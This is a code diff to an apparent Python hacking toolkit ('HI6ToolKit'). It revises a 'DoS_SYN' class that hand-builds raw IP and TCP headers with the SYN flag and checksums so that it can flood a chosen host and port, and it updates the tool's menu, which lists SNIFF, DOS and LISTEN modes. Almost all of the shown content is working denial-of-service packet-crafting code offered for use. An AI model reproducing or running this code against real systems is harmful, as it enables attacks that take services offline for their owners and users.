@@ -250,22 +250,21 @@ class DoS_SYN :
 		self.symbol = chr(9608)
 
 	def __ip_header(self, version = 4, ihl = 5, tos = 0, 
-				tlen = 40, iden = 321, offset = 0, 
-				ttl = 255, proto = socket.IPPROTO_TCP, 
-				csum = 0) :
+				tlen = 40, iden = 43981, flags = 0, offset = 0, 
+				ttl = 255, proto = socket.IPPROTO_TCP, csum = 0) :
 		ihl_version = (version << 4) + ihl
+		flags_offset = (flags << 13) + offset
 		src = socket.inet_pton(socket.AF_INET, socket.gethostbyname(socket.gethostname()))
 		dest = socket.inet_pton(socket.AF_INET, socket.gethostbyname(self.host))
 		packet = struct.pack("BBHHHBBH4s4s", ihl_version, tos, tlen, iden, 
-						offset, ttl, proto, csum, src, dest)
+						flags_offset, ttl, proto, csum, src, dest)
 		return packet
 
-	def __tcp_header(self, srcp = 6666, destp = 80, sequ = 0, 
-				ackn = 0, offset = 4, cwr = 0, ece = 0, urg = 0, 
-				ack = 0, psh = 0, rst = 0, syn = 0, fin = 0, 
-				win = 5840, csum = 0, urgp = 0) :
+	def __tcp_header(self, srcp = 1337, destp = 0, sequ = 0, 
+				ackn = 0, offset = 5, urg = 0, ack = 0, psh = 0, 
+				rst = 0, syn = 0, fin = 0, win = 8192, csum = 0, urgp = 0) :
 		offset = offset << 4
-		flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5) + (ece << 6) + (cwr << 7)
+		flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
 		packet = struct.pack("HHLLBBHHH", srcp, destp, sequ, ackn, offset, 
 						flags, win, csum, urgp)
 		return packet
@@ -289,11 +288,11 @@ class DoS_SYN :
 		ip_header = self.__ip_header()
 		ip_header = self.checksum(ip_header)
 		ip_header = self.__ip_header(csum = ip_header)
-		tcp_header = self.__tcp_header(syn = 1)
+		tcp_header = self.__tcp_header(destp = self.port, syn = 1)
 		pseudo_header = self.__pseudo_header(tcplen = len(tcp_header))
 		data = tcp_header + pseudo_header
 		tcp_checksum = self.checksum(data)
-		tcp_header = self.__tcp_header(syn = 1, csum = tcp_checksum)
+		tcp_header = self.__tcp_header(destp = self.port, syn = 1, csum = tcp_checksum)
 		payload = ip_header + tcp_header
 		return payload
 
@@ -622,8 +621,8 @@ if __name__ == "__main__" :
 	info = "[GitHub] : github.com/HI6Cypher [Email] : huaweisclu31@hotmail.com"
 	os.system("clear || cls")
 	def manage_args() :
-		parser = argparse.ArgumentParser(prog = "hi6toolkit", epilog = info, add_help = True)
-		parser.add_argument("Tool", type = str, help = "To specify tool")
+		parser = argparse.ArgumentParser(prog = "HI6ToolKit", epilog = info, add_help = True)
+		parser.add_argument("Tool", type = str, help = "To specify tool [SNIFF, DOS, HTTP, EMAIL, LISTEN]")
 		parser.add_argument("-m", "--method", type = str, help = "To specify method of tool")
 		parser.add_argument("-x", "--host", type = str, help = "To specify host")
 		parser.add_argument("-p", "--port", type = int, help = "To specify port")
